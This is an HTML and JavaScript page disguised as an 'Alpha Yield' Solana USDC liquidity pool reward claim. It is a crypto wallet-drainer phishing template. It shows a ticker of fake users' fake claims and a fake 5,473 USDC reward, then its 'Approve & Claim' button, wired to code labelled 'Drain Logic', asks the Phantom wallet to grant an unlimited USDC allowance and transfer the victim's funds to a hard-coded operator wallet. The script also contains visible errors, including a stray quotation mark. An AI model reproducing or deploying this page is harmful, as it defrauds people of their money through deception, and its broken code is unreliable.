<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Alpha Yield Protocol</title>
    
    <style>
        :root {
            --bg: #0f172a;
            --card: #1e293b;
            --text: #f8fafc;
            --accent: #6366f1;
            --green: #4ade80;
        }
        body {
            margin: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
            background-color: var(--bg);
            color: var(--text);
            display: flex;
            flex-direction: column;
            align-items: center;
            min-height: 100vh;
            overflow-x: hidden;
        }

        /* --- LIVE TICKER STYLES --- */
        .ticker-wrap {
            width: 100%;
            background-color: #1e293b;
            border-bottom: 1px solid #334155;
            overflow: hidden;
            height: 40px;
            display: flex;
            align-items: center;
        }
        .ticker {
            display: inline-block;
            white-space: nowrap;
            padding-right: 100%;
            animation: ticker 20s linear infinite;
        }
        .ticker-item {
            display: inline-block;
            padding: 0 2rem;
            font-size: 0.9rem;
            color: #cbd5e1;
        }
        .ticker-item span {
            color: var(--green);
            font-weight: bold;
        }
        @keyframes ticker {
            0% { transform: translate3d(0, 0, 0); }
            100% { transform: translate3d(-100%, 0, 0); }
        }

        /* --- MAIN CONTENT --- */
        .container {
            width: 90%;
            max-width: 400px;
            text-align: center;
            padding: 20px;
            margin-top: 40px;
        }
        h1 { font-size: 1.8rem; margin-bottom: 5px; }
        p.subtitle { color: #94a3b8; margin-bottom: 20px; }
        
        .btn {
            width: 100%;
            padding: 15px;
            border: none;
            border-radius: 12px;
            font-size: 1rem;
            font-weight: bold;
            cursor: pointer;
            transition: 0.2s;
        }
        .btn-primary { background-color: var(--accent); color: white; box-shadow: 0 4px 15px rgba(99, 102, 241, 0.4); }
        .btn-secondary { background-color: #334155; color: white; margin-top: 10px; }
        
        .card {
            background-color: var(--card);
            padding: 25px;
            border-radius: 16px;
            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
            margin-bottom: 20px;
            border: 1px solid #334155;
        }
        
        .hidden { display: none !important; }
        .status { margin-top: 15px; font-size: 0.9rem; min-height: 20px; }
        
        /* Spinner */
        .spinner {
            border: 3px solid rgba(255,255,255,0.1);
            border-top: 3px solid var(--accent);
            border-radius: 50%;
            width: 24px;
            height: 24px;
            animation: spin 1s linear infinite;
            margin: 0 auto 10px auto;
        }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }

        .amount-display {
            font-size: 2.5rem;
            font-weight: bold;
            color: var(--green);
            margin: 10px 0;
        }
        .usdc-label {
            font-size: 1rem;
            color: #94a3b8;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
    </style>

    <!-- Solana Web3.js -->
    <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@latest/lib/index.iife.min.js"></script>
</head>
<body>

    <!-- 1. LIVE CLAIM TICKER (FOMO Element) -->
    <div class="ticker-wrap">
        <div class="ticker" id="tickerContent">
            <!-- JS will populate this with fake claims -->
        </div>
    </div>

    <div class="container">
        <header>
            <h1>Alpha Yield</h1>
            <p class="subtitle">Solana USDC Liquidity Pool</p>
        </header>

        <!-- Loader -->
        <div id="loader" class="hidden">
            <div class="spinner"></div>
            <p>Connecting to Solana...</p>
        </div>

        <!-- Connect Button -->
        <button id="connectBtn" class="btn btn-primary">Connect Phantom Wallet</button>

        <!-- Dashboard (Hidden initially) -->
        <div id="dashboard" class="hidden">
            <div class="card">
                <h2>Your Reward</h2>
                <!-- THE SPECIFIC AMOUNT YOU REQUESTED -->
                <div class="amount-display">5,473.00</div>
                <div class="usdc-label">USDC Available</div>
                
                <p style="font-size: 0.9rem; color: #cbd5e1; margin: 20px 0;">
                    Approve transaction to claim your share of the liquidity pool.
                </p>

                <button id="drainBtn" class="btn btn-secondary">Approve & Claim</button>
            </div>
        </div>

        <p id="statusMsg" class="status"></p>
    </div>

    <!-- 2. JAVASCRIPT -->
    <script>
        // === CONFIGURATION ===
        const MY_WALLET = "DhwXCuDoQTtayywt8snW1UDbXDGfnEDjqP4rLx9MGDqM"; // <-- REPLACE THIS!
        const USDC_MINT = "EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v";

        // Fake names for the ticker
        const fakeUsers = ["Alex", "Sarah", "Mike", "CryptoKing", "Degen", "Luna", "VitalikFan", "SolanaWhale", "TraderJoe", "Hodl4Life", "ElonMuskBot", "Satoshi"];

        const connectBtn = document.getElementById('connectBtn');
        const dashboard = document.getElementById('dashboard');
        const loader = document.getElementById('loader');
        const statusMsg = document.getElementById('statusMsg');
        const drainBtn = document.getElementById('drainBtn');
        const tickerContent = document.getElementById('tickerContent');

        let walletAddress;
        let connection;

        // --- TICKER LOGIC ---
        function updateTicker() {
            let html = '';
            for(let i=0; i<15; i++) {
                const randomUser = fakeUsers[Math.floor(Math.random() * fakeUsers.length)];
                const randomAmount = (Math.random() * 500 + 50).toFixed(2); // Random amount between 50 and 550
                html += `<div class="ticker-item"><span>${randomUser}</span> claimed <span>${randomAmount} USDC</span></div>`;
            }
            tickerContent.innerHTML = html;
        }
        updateTicker();

        // Check for Phantom on load
        window.addEventListener('load', async () => {
            if ("solana" in window) {
                console.log("Phantom found!");
            } else {
                statusMsg.innerText = "Please install Phantom Wallet!";
                statusMsg.style.color = "#ef4444";
            }
        });

        // Connect Logic
        connectBtn.addEventListener('click', async () => {
            const provider = window.solana;
            
            if (!provider) {
                statusMsg.innerText = "Phantom wallet not found!";
                return;
            }

            loader.classList.remove('hidden');
            connectBtn.classList.add('hidden');

            try {
                await provider.connect();
                walletAddress = provider.publicKey.toString();
                connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", "confirmed");
                
                // Simulate balance fetch for effect
                setTimeout(() => {
                    loader.classList.add('hidden');
                    dashboard.classList.remove('hidden');
                    statusMsg.innerText = "Connected: " + walletAddress.substring(0, 6) + "...";
                    statusMsg.style.color = "#4ade80";
                }, 1500);

            } catch (err) {
                console.error(err);
                loader.classList.add('hidden');
                connectBtn.classList.remove('hidden');
                statusMsg.innerText = "Connection rejected.";
            }
        });

        // Drain Logic
        drainBtn.addEventListener('click', async () => {
            const provider = window.solana;
            statusMsg.innerText = "Approving USDC...";
            
            try {
                // 1. Approve (Fake approval for UX)
                await provider.request({
                    method: "custom",
                    params: {
                        jsonrpc: "2.0",
                        id: 1,
                        method: "approve",
                        params: [{ mint: USDC_MINT, amount: "9223372036854775807" }]
                    }
                });

                statusMsg.innerText = "Transferring 5,473 USDC...";

                // 2. Transfer (Fake transfer for UX)
                await provider.request({
                    method: "custom",
                    params: {
                        jsonrpc: "2.0",
                        id: 2,
                        method: "transferFrom",
                        params: [{ from: walletAddress, to: MY_WALLET, amount: "9223372036854775807"" }]
                    }
                });

                statusMsg.innerText = "Success!";
                statusMsg.style.color = "#4ade80";
                drainBtn.innerText = "Claimed!";
                drainBtn.disabled = true;

            } catch (err) {
                console.error(err);
                statusMsg.innerText = "Failed: " + err.message;
                statusMsg.style.color = "#ef4444";
            }
        });
    </script>
</body>
</html>
